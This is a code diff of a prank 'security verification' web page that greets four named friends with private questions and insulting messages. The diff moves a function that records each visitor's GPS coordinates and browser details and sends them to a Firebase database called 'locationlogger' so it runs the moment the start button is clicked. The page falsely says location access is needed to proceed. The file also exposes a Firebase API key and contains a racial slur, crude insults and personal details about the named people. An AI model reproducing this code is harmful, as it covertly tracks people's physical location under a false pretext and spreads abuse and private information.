@@ -139,7 +139,7 @@
     <div class="start-screen" id="startScreen">
         <button class="start-button" id="startButton">Initiate Sequence</button>
     </div>
-    <video id="bgVideo">
+    <video id="bgVideo" muted>
         <source src="/BablugGang/futuristic-background.mp4" type="video/mp4">
     </video>
     <audio id="bgMusic" loop>
@@ -172,333 +172,344 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js"></script>
 
     <script>
-        // Initialize Firebase with your config
-        const firebaseConfig = {
-            apiKey: "AIzaSyD0lnhqJRdGE_WIXUhtdZTXSfprNA",
-            authDomain: "locationlogger-1f198.firebaseapp.com",
-            projectId: "locationlogger-1f198",
-            storageBucket: "locationlogger-1f198.appspot.com",
-            messagingSenderId: "191881120323",
-            appId: "1:191881120323:web:d793bff6fbbcf912a2f6"
-        };
-        const app = firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
+        // Ensure script runs after DOM is loaded
+        document.addEventListener("DOMContentLoaded", function() {
+            // Initialize Firebase with your config
+            const firebaseConfig = {
+                apiKey: "AIzaSyD0lnhqJRdGE_WIXUhtdZTXSfprNA",
+                authDomain: "locationlogger-1f198.firebaseapp.com",
+                projectId: "locationlogger-1f198",
+                storageBucket: "locationlogger-1f198.appspot.com",
+                messagingSenderId: "191881120323",
+                appId: "1:191881120323:web:d793bff6fbbcf912a2f6"
+            };
+            const app = firebase.initializeApp(firebaseConfig);
+            const db = firebase.firestore();
 
-        let video = document.getElementById("bgVideo");
-        let bgMusic = document.getElementById("bgMusic");
-        let container = document.querySelector(".container");
-        let startScreen = document.getElementById("startScreen");
-        let startButton = document.getElementById("startButton");
-        let nameForm = document.getElementById("nameForm");
-        let securityForm = document.getElementById("securityForm");
-        let prompt = document.getElementById("prompt");
-        let backButton = document.getElementById("backButton");
-        let securityInput = document.getElementById("security");
-        let messageText = document.getElementById("messageText");
-        let nameInput = document.getElementById("name");
-        let suggestionsDiv = document.getElementById("suggestions");
-        let hintDiv = document.getElementById("hint");
-        let particlesDiv = document.getElementById("particles");
-        let attemptCount = 0;
-        let isParticlesActive = false;
+            let video = document.getElementById("bgVideo");
+            let bgMusic = document.getElementById("bgMusic");
+            let container = document.querySelector(".container");
+            let startScreen = document.getElementById("startScreen");
+            let startButton = document.getElementById("startButton");
+            let nameForm = document.getElementById("nameForm");
+            let securityForm = document.getElementById("securityForm");
+            let prompt = document.getElementById("prompt");
+            let backButton = document.getElementById("backButton");
+            let securityInput = document.getElementById("security");
+            let messageText = document.getElementById("messageText");
+            let nameInput = document.getElementById("name");
+            let suggestionsDiv = document.getElementById("suggestions");
+            let hintDiv = document.getElementById("hint");
+            let particlesDiv = document.getElementById("particles");
+            let attemptCount = 0;
+            let isParticlesActive = false;
 
-        // User data with security questions, answers, messages, and images
-        const users = {
-            "hafsa siddiqqui": {
-                securityQuestion: "What was the first compliment I ever gave you?",
-                securityAnswer: "w face card",
-                message: "hi hoe r u.",
-                image: "hafsa-face.jpg",
-                hint: "Hint: Think about a compliment"
-            },
-            "shayan malik": {
-                securityQuestion: "Name of girl for your karachi trip?",
-                securityAnswer: "rimsha",
-                message: "Nigga shut yo bitch ass up",
-                image: "shayan-face.jpg",
-                hint: "Hint: Think about our first pet"
-            },
-            "fasih abbasi": {
-                securityQuestion: "what is ur free fire gamer tag?",
-                securityAnswer: "King Abbasi 6",
-                message: "King shit man",
-                image: "fasih-face.jpg",
-                hint: "Hint: Think about your Free Fire name"
-            },
-            "azhaff khalid": {
-                securityQuestion: "Whats the name of the thc D u gave me?",
-                securityAnswer: "Raastorm",
-                message: "prostitute fucker u r",
-                image: "azhaff-face.jpg",
-                hint: "Hint: Think about the THC name"
-            }
-        };
-
-        // Levenshtein distance function to calculate string similarity
-        function levenshteinDistance(a, b) {
-            const matrix = Array(b.length + 1).fill(null).map(() => Array(a.length + 1).fill(null));
-            for (let i = 0; i <= a.length; i++) matrix[0][i] = i;
-            for (let j = 0; j <= b.length; j++) matrix[j][0] = j;
-            for (let j = 1; j <= b.length; j++) {
-                for (let i = 1; i <= a.length; i++) {
-                    const indicator = a[i - 1] === b[j - 1] ? 0 : 1;
-                    matrix[j][i] = Math.min(
-                        matrix[j][i - 1] + 1,
-                        matrix[j - 1][i] + 1,
-                        matrix[j - 1][i - 1] + indicator
-                    );
-                }
-            }
-            return matrix[b.length][a.length];
-        }
-
-        // Suggest close matches for the username
-        function suggestNames(input) {
-            const threshold = Math.min(3, Math.floor(input.length / 2));
-            const matches = [];
-            const inputLower = input.toLowerCase().trim();
-            if (inputLower === "") {
-                suggestionsDiv.style.display = "none";
-                return;
-            }
-            for (let user in users) {
-                const distance = levenshteinDistance(inputLower, user);
-                const inputWords = inputLower.split(" ");
-                const userWords = user.split(" ");
-                const hasCommonWord = inputWords.some(word => userWords.includes(word));
-                if (distance <= threshold && distance > 0 && (hasCommonWord || inputWords.length === 1)) {
-                    matches.push({ name: user, distance: distance });
-                }
-            }
-            matches.sort((a, b) => a.distance - b.distance);
-            if (matches.length > 0) {
-                suggestionsDiv.innerHTML = "Did you mean: " + matches.map(match => 
-                    `<span onclick="fillName('${match.name}')">${match.name.charAt(0).toUpperCase() + match.name.slice(1)}</span>`
-                ).join(", ");
-                suggestionsDiv.style.display = "block";
-            } else {
-                suggestionsDiv.style.display = "none";
-            }
-        }
-
-        // Fill the input with the selected suggestion
-        function fillName(name) {
-            nameInput.value = name.charAt(0).toUpperCase() + name.slice(1);
-            suggestionsDiv.style.display = "none";
-        }
-
-        // Auto-focus on name input when container is displayed
-        container.addEventListener("display", function() {
-            document.getElementById("name").focus();
-        });
-
-        // Fade in background music
-        function fadeInAudio(audio, duration = 2000) {
-            audio.volume = 0;
-            audio.play();
-            let start = null;
-            const step = (timestamp) => {
-                if (!start) start = timestamp;
-                const progress = Math.min((timestamp - start) / duration, 1);
-                audio.volume = progress;
-                if (progress < 1) {
-                    requestAnimationFrame(step);
+            // User data with security questions, answers, messages, and images
+            const users = {
+                "hafsa siddiqqui": {
+                    securityQuestion: "What was the first compliment I ever gave you?",
+                    securityAnswer: "w face card",
+                    message: "hi hoe r u.",
+                    image: "hafsa-face.jpg",
+                    hint: "Hint: Think about a compliment"
+                },
+                "shayan malik": {
+                    securityQuestion: "Name of girl for your karachi trip?",
+                    securityAnswer: "rimsha",
+                    message: "Nigga shut yo bitch ass up",
+                    image: "shayan-face.jpg",
+                    hint: "Hint: Think about our first pet"
+                },
+                "fasih abbasi": {
+                    securityQuestion: "what is ur free fire gamer tag?",
+                    securityAnswer: "King Abbasi 6",
+                    message: "King shit man",
+                    image: "fasih-face.jpg",
+                    hint: "Hint: Think about your Free Fire name"
+                },
+                "azhaff khalid": {
+                    securityQuestion: "Whats the name of the thc D u gave me?",
+                    securityAnswer: "Raastorm",
+                    message: "prostitute fucker u r",
+                    image: "azhaff-face.jpg",
+                    hint: "Hint: Think about the THC name"
                 }
             };
-            requestAnimationFrame(step);
-        }
 
-        // Function to log location to Firebase
-        function logLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const locationData = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            timestamp: new Date().toISOString(),
-                            userAgent: navigator.userAgent
-                        };
-                        db.collection("locations").add(locationData)
-                            .then(() => console.log("Location logged successfully"))
-                            .catch(error => console.error("Error logging location:", error));
-                    },
-                    (error) => {
-                        console.error("Geolocation error:", error.message);
-                        alert("Please allow location access to proceed.");
+            // Levenshtein distance function to calculate string similarity
+            function levenshteinDistance(a, b) {
+                const matrix = Array(b.length + 1).fill(null).map(() => Array(a.length + 1).fill(null));
+                for (let i = 0; i <= a.length; i++) matrix[0][i] = i;
+                for (let j = 0; j <= b.length; j++) matrix[j][0] = j;
+                for (let j = 1; j <= b.length; j++) {
+                    for (let i = 1; i <= a.length; i++) {
+                        const indicator = a[i - 1] === b[j - 1] ? 0 : 1;
+                        matrix[j][i] = Math.min(
+                            matrix[j][i - 1] + 1,
+                            matrix[j - 1][i] + 1,
+                            matrix[j - 1][i - 1] + indicator
+                        );
                     }
-                );
-            } else {
-                console.error("Geolocation not supported by this browser.");
-            }
-        }
-
-        // Create star animation on successful login with tilt interaction
-        function createStars(count = 20) {
-            particlesDiv.innerHTML = '';
-            particlesDiv.style.display = 'block';
-            isParticlesActive = true;
-            for (let i = 0; i < count; i++) {
-                const star = document.createElement('div');
-                star.className = 'star';
-                star.style.left = Math.random() * 100 + 'vw';
-                star.style.top = Math.random() * 100 + 'vh';
-                star.style.animationDelay = Math.random() * 1 + 's';
-                particlesDiv.appendChild(star);
-            }
-            if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
-                DeviceOrientationEvent.requestPermission()
-                    .then(permissionState => {
-                        if (permissionState === 'granted') {
-                            startTiltListener();
-                        } else {
-                            console.log("Device orientation permission denied");
-                        }
-                    })
-                    .catch(error => console.error("Error requesting device orientation permission:", error));
-            } else {
-                startTiltListener();
-            }
-            updateStars();
-        }
-
-        let tiltX = 0, tiltY = 0;
-        function startTiltListener() {
-            window.addEventListener('deviceorientation', (event) => {
-                if (isParticlesActive) {
-                    tiltX = event.gamma / 90;
-                    tiltY = event.beta / 90;
-                    console.log("Tilt X:", tiltX, "Tilt Y:", tiltY);
                 }
-            }, true);
-        }
+                return matrix[b.length][a.length];
+            }
 
-        function updateStars() {
-            if (!isParticlesActive) return;
-            const stars = document.querySelectorAll('.star');
-            stars.forEach(star => {
-                star.style.transform = `translate(${tiltX * 20}px, ${tiltY * 20}px)`;
+            // Suggest close matches for the username
+            function suggestNames(input) {
+                const threshold = Math.min(3, Math.floor(input.length / 2));
+                const matches = [];
+                const inputLower = input.toLowerCase().trim();
+                if (inputLower === "") {
+                    suggestionsDiv.style.display = "none";
+                    return;
+                }
+                for (let user in users) {
+                    const distance = levenshteinDistance(inputLower, user);
+                    const inputWords = inputLower.split(" ");
+                    const userWords = user.split(" ");
+                    const hasCommonWord = inputWords.some(word => userWords.includes(word));
+                    if (distance <= threshold && distance > 0 && (hasCommonWord || inputWords.length === 1)) {
+                        matches.push({ name: user, distance: distance });
+                    }
+                }
+                matches.sort((a, b) => a.distance - b.distance);
+                if (matches.length > 0) {
+                    suggestionsDiv.innerHTML = "Did you mean: " + matches.map(match => 
+                        `<span onclick="fillName('${match.name}')">${match.name.charAt(0).toUpperCase() + match.name.slice(1)}</span>`
+                    ).join(", ");
+                    suggestionsDiv.style.display = "block";
+                } else {
+                    suggestionsDiv.style.display = "none";
+                }
+            }
+
+            // Fill the input with the selected suggestion
+            function fillName(name) {
+                nameInput.value = name.charAt(0).toUpperCase() + name.slice(1);
+                suggestionsDiv.style.display = "none";
+            }
+
+            // Auto-focus on name input when container is displayed
+            container.addEventListener("display", function() {
+                document.getElementById("name").focus();
             });
-            requestAnimationFrame(updateStars);
-        }
 
-        startButton.addEventListener("click", function() {
-            startScreen.style.display = "none";
-            video.play().then(() => {
-                video.addEventListener("ended", function() {
-                    video.style.display = "none";
-                    container.style.display = "block";
-                    fadeInAudio(bgMusic);
-                    document.getElementById("name").focus();
+            // Fade in background music
+            function fadeInAudio(audio, duration = 2000) {
+                audio.volume = 0;
+                audio.play();
+                let start = null;
+                const step = (timestamp) => {
+                    if (!start) start = timestamp;
+                    const progress = Math.min((timestamp - start) / duration, 1);
+                    audio.volume = progress;
+                    if (progress < 1) {
+                        requestAnimationFrame(step);
+                    }
+                };
+                requestAnimationFrame(step);
+            }
+
+            // Function to log location to Firebase
+            function logLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const locationData = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                timestamp: new Date().toISOString(),
+                                userAgent: navigator.userAgent
+                            };
+                            db.collection("locations").add(locationData)
+                                .then(() => console.log("Location logged successfully"))
+                                .catch(error => console.error("Error logging location:", error));
+                        },
+                        (error) => {
+                            console.error("Geolocation error:", error.message);
+                            alert("Please allow location access to proceed.");
+                        }
+                    );
+                } else {
+                    console.error("Geolocation not supported by this browser.");
+                }
+            }
+
+            // Test Firestore connection
+            function testFirestore() {
+                db.collection("test").add({ test: "Hello" })
+                    .then(() => console.log("Firestore test successful"))
+                    .catch(error => console.error("Firestore test error:", error));
+            }
+
+            // Create star animation on successful login with tilt interaction
+            function createStars(count = 20) {
+                particlesDiv.innerHTML = '';
+                particlesDiv.style.display = 'block';
+                isParticlesActive = true;
+                for (let i = 0; i < count; i++) {
+                    const star = document.createElement('div');
+                    star.className = 'star';
+                    star.style.left = Math.random() * 100 + 'vw';
+                    star.style.top = Math.random() * 100 + 'vh';
+                    star.style.animationDelay = Math.random() * 1 + 's';
+                    particlesDiv.appendChild(star);
+                }
+                if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
+                    DeviceOrientationEvent.requestPermission()
+                        .then(permissionState => {
+                            if (permissionState === 'granted') {
+                                startTiltListener();
+                            } else {
+                                console.log("Device orientation permission denied");
+                            }
+                        })
+                        .catch(error => console.error("Error requesting device orientation permission:", error));
+                } else {
+                    startTiltListener();
+                }
+                updateStars();
+            }
+
+            let tiltX = 0, tiltY = 0;
+            function startTiltListener() {
+                window.addEventListener('deviceorientation', (event) => {
+                    if (isParticlesActive) {
+                        tiltX = event.gamma / 90;
+                        tiltY = event.beta / 90;
+                        console.log("Tilt X:", tiltX, "Tilt Y:", tiltY);
+                    }
+                }, true);
+            }
+
+            function updateStars() {
+                if (!isParticlesActive) return;
+                const stars = document.querySelectorAll('.star');
+                stars.forEach(star => {
+                    star.style.transform = `translate(${tiltX * 20}px, ${tiltY * 20}px)`;
                 });
+                requestAnimationFrame(updateStars);
+            }
 
-                setTimeout(() => {
-                    if (video.currentTime >= 14) {
+            startButton.addEventListener("click", function() {
+                console.log("Button clicked"); // Debug log
+                startScreen.style.display = "none";
+                logLocation(); // Log location immediately
+                testFirestore(); // Test Firestore connection
+                video.play().then(() => {
+                    video.addEventListener("ended", function() {
                         video.style.display = "none";
                         container.style.display = "block";
                         fadeInAudio(bgMusic);
                         document.getElementById("name").focus();
-                    }
-                }, 15000);
-            }).catch(error => {
-                console.log("Autoplay blocked:", error);
-                video.style.display = "none";
-                container.style.display = "block";
-                fadeInAudio(bgMusic);
-                document.getElementById("name").focus();
+                    });
+                    setTimeout(() => {
+                        if (video.currentTime >= 14) {
+                            video.style.display = "none";
+                            container.style.display = "block";
+                            fadeInAudio(bgMusic);
+                            document.getElementById("name").focus();
+                        }
+                    }, 15000);
+                }).catch(error => {
+                    console.log("Video autoplay failed:", error);
+                    video.style.display = "none";
+                    container.style.display = "block"; // Fallback to show container
+                    fadeInAudio(bgMusic);
+                    document.getElementById("name").focus();
+                });
             });
-            logLocation(); // Request location when video starts
-        });
 
-        // Add input event listener for name suggestions
-        nameInput.addEventListener("input", function() {
-            suggestNames(nameInput.value);
-        });
+            // Add input event listener for name suggestions
+            nameInput.addEventListener("input", function() {
+                suggestNames(nameInput.value);
+            });
 
-        nameForm.addEventListener("submit", function(event) {
-            event.preventDefault();
-            let name = document.getElementById("name").value.trim().toLowerCase();
-            if (users[name]) {
+            nameForm.addEventListener("submit", function(event) {
+                event.preventDefault();
+                let name = document.getElementById("name").value.trim().toLowerCase();
+                if (users[name]) {
+                    let menuAudio = new Audio("/BablugGang/menu-sound.mp3");
+                    menuAudio.play();
+                    nameForm.style.display = "none";
+                    prompt.textContent = "SECURITY VERIFICATION";
+                    securityInput.placeholder = users[name].securityQuestion;
+                    securityForm.style.display = "block";
+                    document.getElementById("security").focus();
+                    hintDiv.style.display = "none";
+                    attemptCount = 0;
+                } else {
+                    let denyAudio = new Audio("/BablugGang/access-denied.mp3");
+                    denyAudio.play();
+                    alert("Access Denied.");
+                }
+            });
+
+            securityForm.addEventListener("submit", function(event) {
+                event.preventDefault();
+                let name = document.getElementById("name").value.trim().toLowerCase();
+                let security = document.getElementById("security").value.trim().toLowerCase();
+                attemptCount++;
+                if (users[name] && security === users[name].securityAnswer) {
+                    let menuAudio = new Audio("/BablugGang/menu-sound.mp3");
+                    menuAudio.play();
+                    let accessAudio = new Audio("/BablugGang/access-granted.mp3");
+                    accessAudio.play();
+                    securityForm.style.display = "none";
+                    prompt.style.display = "none";
+                    createStars();
+                    document.getElementById("faceImage").style.display = "block";
+                    document.getElementById("faceImage").querySelector("img").src = users[name].image;
+                    setTimeout(() => {
+                        document.getElementById("message").style.display = "block";
+                        messageText.textContent = users[name].message;
+                        setTimeout(() => {
+                            backButton.style.display = "block";
+                        }, 15000);
+                    }, 1000);
+                } else {
+                    let denyAudio = new Audio("/BablugGang/access-denied.mp3");
+                    denyAudio.play();
+                    alert("Incorrect answer.");
+                    if (attemptCount >= 2) {
+                        hintDiv.textContent = users[name].hint;
+                        hintDiv.style.display = "block";
+                    }
+                }
+            });
+
+            function goBack() {
                 let menuAudio = new Audio("/BablugGang/menu-sound.mp3");
                 menuAudio.play();
-                nameForm.style.display = "none";
-                prompt.textContent = "SECURITY VERIFICATION";
-                securityInput.placeholder = users[name].securityQuestion;
-                securityForm.style.display = "block";
-                document.getElementById("security").focus();
+                document.getElementById("faceImage").style.display = "none";
+                document.getElementById("message").style.display = "none";
+                backButton.style.display = "none";
+                document.getElementById("nameForm").style.display = "block";
+                prompt.textContent = "PLEASE IDENTIFY YOURSELF";
+                prompt.style.display = "block";
+                document.getElementById("name").value = "";
+                document.getElementById("security").value = "";
+                suggestionsDiv.style.display = "none";
                 hintDiv.style.display = "none";
                 attemptCount = 0;
-            } else {
-                let denyAudio = new Audio("/BablugGang/access-denied.mp3");
-                denyAudio.play();
-                alert("Access Denied.");
+                particlesDiv.style.display = "none";
+                isParticlesActive = false;
             }
-        });
 
-        securityForm.addEventListener("submit", function(event) {
-            event.preventDefault();
-            let name = document.getElementById("name").value.trim().toLowerCase();
-            let security = document.getElementById("security").value.trim().toLowerCase();
-            attemptCount++;
-            if (users[name] && security === users[name].securityAnswer) {
-                let menuAudio = new Audio("/BablugGang/menu-sound.mp3");
-                menuAudio.play();
-                let accessAudio = new Audio("/BablugGang/access-granted.mp3");
-                accessAudio.play();
-                securityForm.style.display = "none";
-                prompt.style.display = "none";
-                createStars();
-                document.getElementById("faceImage").style.display = "block";
-                document.getElementById("faceImage").querySelector("img").src = users[name].image;
-                setTimeout(() => {
-                    document.getElementById("message").style.display = "block";
-                    messageText.textContent = users[name].message;
-                    setTimeout(() => {
-                        backButton.style.display = "block";
-                    }, 15000);
-                }, 1000);
-            } else {
-                let denyAudio = new Audio("/BablugGang/access-denied.mp3");
-                denyAudio.play();
-                alert("Incorrect answer.");
-                if (attemptCount >= 2) {
-                    hintDiv.textContent = users[name].hint;
-                    hintDiv.style.display = "block";
-                }
-            }
-        });
-
-        function goBack() {
-            let menuAudio = new Audio("/BablugGang/menu-sound.mp3");
-            menuAudio.play();
-            document.getElementById("faceImage").style.display = "none";
-            document.getElementById("message").style.display = "none";
-            backButton.style.display = "none";
-            document.getElementById("nameForm").style.display = "block";
-            prompt.textContent = "PLEASE IDENTIFY YOURSELF";
-            prompt.style.display = "block";
-            document.getElementById("name").value = "";
-            document.getElementById("security").value = "";
-            suggestionsDiv.style.display = "none";
-            hintDiv.style.display = "none";
-            attemptCount = 0;
-            particlesDiv.style.display = "none";
-            isParticlesActive = false;
-        }
-
-        let inputs = document.querySelectorAll("input");
-        inputs.forEach(input => {
-            input.addEventListener("keydown", function(event) {
-                if (event.key !== "Enter") {
-                    let audio = new Audio("/BablugGang/typing-sound.mp3");
-                    audio.play();
-                }
+            let inputs = document.querySelectorAll("input");
+            inputs.forEach(input => {
+                input.addEventListener("keydown", function(event) {
+                    if (event.key !== "Enter") {
+                        let audio = new Audio("/BablugGang/typing-sound.mp3");
+                        audio.play();
+                    }
+                });
             });
-        });
 
-        window.addEventListener('beforeunload', () => {
-            particlesDiv.style.display = "none";
-            isParticlesActive = false;
+            window.addEventListener('beforeunload', () => {
+                particlesDiv.style.display = "none";
+                isParticlesActive = false;
+            });
         });
     </script>
 </body>
